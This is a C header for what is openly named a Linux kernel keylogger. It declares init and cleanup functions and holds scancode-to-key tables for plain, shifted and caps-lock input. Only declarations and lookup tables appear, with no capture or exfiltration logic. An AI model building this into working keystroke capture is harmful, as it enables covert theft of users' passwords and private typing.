#ifndef __KEYLOGGER_H
#define __KEYLOGGER_H

#include <linux/workqueue.h>
#include <linux/keyboard.h>

#include "common.h"
#include "misc.h"

int keylogger_init(void);
int keylogger_clean(void);

static const char *keymap[] =
    {"\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "<BACKSPACE>",
     "<TAB>", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "<ENTER>", "<CTRL>",
     "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "#", "<SHIFT>", "\\", "z", "x",
     "c", "v", "b", "n", "m", ",", ".", "/", "<SHIFT>", "\0", "\0", " ", "<CAPSLOCK>", "<F1>",
     "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>", "<NUMLOCK>",
     "<SCROLLLOCK>", "7", "8", "9", "-", "4", "5", "6", "+", "1", "2", "3", "0", ".", "\0",
     "\0", "\0", "<F11>", "<F12>", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "<ENTER>",
     "<CTRL>", "/", "<PRTSCR>", "ALT", "\0", "<HOME>", "<UP>", "<PGUP>", "<LEFT>", "<RIGHT>",
     "<END>", "<DOWN>", "<PGDN>", "<INSERT>", "<DEL>", "\0", "\0", "\0", "\0", "\0", "\0",
     "\0", "<PAUSE>"};

static const char *keymap_shift[] =
    {"\0", "ESC", "!", "\"", "£", "$", "%", "^", "&", "*", "(", ")", "_", "+", "<BACKSPACE>",
     "<TAB>", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "<ENTER>", "<CTRL>",
     "A", "S", "D", "F", "G", "H", "J", "K", "L", ":", "@", "¬", "<SHIFT>", "|", "Z", "X",
     "C", "V", "B", "N", "M", "<", ">", "?", "<SHIFT>", "\0", "\0", " ", "<CAPSLOCK>", "<F1>",
     "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>", "<NUMLOCK>",
     "<SCROLLLOCK>", "7", "8", "9", "-", "4", "5", "6", "+", "1", "2", "3", "0", ".", "\0",
     "\0", "\0", "<F11>", "<F12>", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "<ENTER>",
     "<CTRL>", "/", "<PRTSCR>", "ALT", "\0", "<HOME>", "<UP>", "<PGUP>", "<LEFT>", "<RIGHT>",
     "<END>", "<DOWN>", "<PGDN>", "<INSERT>", "<DEL>", "\0", "\0", "\0", "\0", "\0", "\0",
     "\0", "<PAUSE>"};

static const char *keymap_capslock[] =
    {"\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "<BACKSPACE>",
     "<TAB>", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "[", "]", "<ENTER>", "<CTRL>",
     "A", "S", "D", "F", "G", "H", "J", "K", "L", ";", "'", "#", "<SHIFT>", "\\", "Z", "X",
     "C", "V", "B", "N", "M", "<", ">", "?", "<SHIFT>", "\0", "\0", " ", "<CAPSLOCK>", "<F1>",
     "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>", "<NUMLOCK>",
     "<SCROLLLOCK>", "7", "8", "9", "-", "4", "5", "6", "+", "1", "2", "3", "0", ".", "\0",
     "\0", "\0", "<F11>", "<F12>", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "<ENTER>",
     "<CTRL>", "/", "<PRTSCR>", "ALT", "\0", "<HOME>", "<UP>", "<PGUP>", "<LEFT>", "<RIGHT>",
     "<END>", "<DOWN>", "<PGDN>", "<INSERT>", "<DEL>", "\0", "\0", "\0", "\0", "\0", "\0",
     "\0", "<PAUSE>"};

#endif
